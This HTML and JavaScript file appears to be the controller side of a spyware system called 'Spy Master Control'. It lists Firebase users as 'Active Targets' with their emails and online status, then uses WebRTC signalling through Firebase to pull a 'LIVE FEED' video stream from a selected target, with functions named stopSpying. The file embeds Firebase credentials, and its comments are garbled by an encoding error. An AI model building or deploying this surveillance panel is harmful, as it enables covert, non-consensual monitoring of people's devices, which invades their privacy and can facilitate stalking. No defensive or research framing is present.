<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Master Control</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
    <style>
        body { background: #0f0f0f; color: white; font-family: 'Courier New', monospace; padding: 20px; }
        h2 { color: #00ffcc; text-align: center; border-bottom: 2px solid #333; padding-bottom: 10px; letter-spacing: 2px; }
        
        #userList { list-style: none; padding: 0; }
        .user-card { 
            background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 5px; 
            cursor: pointer; display: flex; justify-content: space-between; 
            border: 1px solid #333; transition: 0.3s; 
        }
        .user-card:hover { background: #252525; border-color: #00ffcc; transform: translateX(5px); }
        
        .status-badge { font-size: 12px; padding: 4px 10px; border-radius: 12px; font-weight: bold; }
        .online { background: #00ffcc; color: black; box-shadow: 0 0 10px #00ffcc; }
        .offline { background: #444; color: #aaa; }

        /* ‡¶™‡¶™-‡¶Ü‡¶™ ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶™‡ßç‡¶≤‡ßá‡ßü‡¶æ‡¶∞ */
        #videoContainer { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.96); z-index: 999; text-align: center; padding-top: 40px; 
        }
        /* ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶ü‡ßç‡¶Ø‡¶æ‡¶ó‡ßá ‡¶¨‡¶∞‡ßç‡¶°‡¶æ‡¶∞ ‡¶è‡¶¨‡¶Ç ‡¶∂‡ßç‡¶Ø‡¶æ‡¶°‡ßã */
        video { width: 95%; max-width: 600px; border: 3px solid #00ffcc; border-radius: 10px; box-shadow: 0 0 30px rgba(0,255,204,0.4); }
        
        .btn-close { 
            padding: 12px 30px; background: red; color: white; border: none; 
            font-weight: bold; cursor: pointer; margin-top: 15px; border-radius: 5px; font-size: 16px;
        }
    </style>
</head>
<body>

    <h2>üïµÔ∏è MASTER CONTROL v3.0</h2>
    <p style="text-align: center; color: #666;">Scanning global targets...</p>

    <h3>Active Targets:</h3>
    <ul id="userList"></ul>

    <div id="videoContainer">
        <h3 id="targetName" style="color: #00ffcc;">Connecting...</h3>
        
        <video id="remoteVideo" autoplay playsinline muted controls></video>
        
        <br>
        <button class="btn-close" onclick="stopSpying()">DISCONNECT</button>
    </div>

    <script>
        // ‡¶§‡ßã‡¶∞ ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶®
        const firebaseConfig = {
          apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
          authDomain: "phone-f605e.firebaseapp.com",
          databaseURL: "https://phone-f605e-default-rtdb.firebaseio.com",
          projectId: "phone-f605e",
          storageBucket: "phone-f605e.firebasestorage.app",
          messagingSenderId: "902490805880",
          appId: "1:902490805880:web:98a5ed1432a0e3538e3f8d",
          measurementId: "G-WSJDCYKM3F"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();
        
        let currentPeer = null;
        let currentTargetId = null;

        // --- ‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶∏‡ßç‡¶ü ‡¶≤‡ßã‡¶° ---
        db.ref("users").on("value", snapshot => {
            const list = document.getElementById("userList");
            list.innerHTML = "";
            
            snapshot.forEach(child => {
                const uid = child.key;
                const data = child.val();
                
                const isOnline = data.status === "online";
                const email = data.email || "Unknown Target";

                const li = document.createElement("li");
                li.className = "user-card";
                li.innerHTML = `
                    <span>üë§ ${email.split('@')[0]}</span> 
                    <span class="status-badge ${isOnline ? 'online' : 'offline'}">${data.status.toUpperCase()}</span>
                `;
                
                if(isOnline) {
                    li.onclick = () => prepareConnection(uid, email);
                } else {
                    li.style.opacity = "0.5";
                    li.style.cursor = "not-allowed";
                }
                list.appendChild(li);
            });
        });

        // --- ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡¶∂‡¶® ‡¶≤‡¶ú‡¶ø‡¶ï ---
        function prepareConnection(uid, email) {
            document.getElementById("videoContainer").style.display = "block";
            document.getElementById("targetName").innerText = "Handshaking with " + email + "...";
            currentTargetId = uid;

            // ‡ßß. ‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶∏‡¶¨ ‡¶∏‡¶ø‡¶ó‡¶®‡ßç‡¶Ø‡¶æ‡¶≤ ‡¶°‡¶ø‡¶≤‡¶ø‡¶ü (‡¶ï‡ßç‡¶≤‡¶ø‡¶® ‡¶∏‡ßç‡¶≤‡ßá‡¶ü)
            db.ref("users/" + uid + "/offer").remove();
            db.ref("users/" + uid + "/answer").remove().then(() => {
                startWebRTC(uid);
            });
        }

        function startWebRTC(targetId) {
            currentPeer = new SimplePeer({ 
                initiator: true, 
                trickle: false,
                config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] } 
            });

            currentPeer.on('signal', offer => {
                db.ref("users/" + targetId + "/offer").set(offer);
            });

            db.ref("users/" + targetId + "/answer").on("value", snapshot => {
                const answer = snapshot.val();
                if (answer && currentPeer) {
                    currentPeer.signal(answer);
                }
            });

            currentPeer.on('stream', stream => {
                const video = document.getElementById("remoteVideo");
                video.srcObject = stream;
                document.getElementById("targetName").innerText = "üî¥ LIVE FEED: " + targetId;
            });

            currentPeer.on('error', err => {
                console.log(err);
                alert("Connection failed. Target might have disconnected.");
                stopSpying();
            });
        }

        function stopSpying() {
            if (currentPeer) currentPeer.destroy();
            currentPeer = null;
            
            if (currentTargetId) {
                db.ref("users/" + currentTargetId + "/offer").remove();
                db.ref("users/" + currentTargetId + "/answer").remove();
            }
            
            document.getElementById("videoContainer").style.display = "none";
            location.reload(); // ‡¶ï‡ßç‡¶≤‡¶ø‡¶® ‡¶•‡¶æ‡¶ï‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶™‡ßá‡¶ú ‡¶∞‡¶ø‡¶≤‡ßã‡¶°
        }
    </script>
</body>
</html>
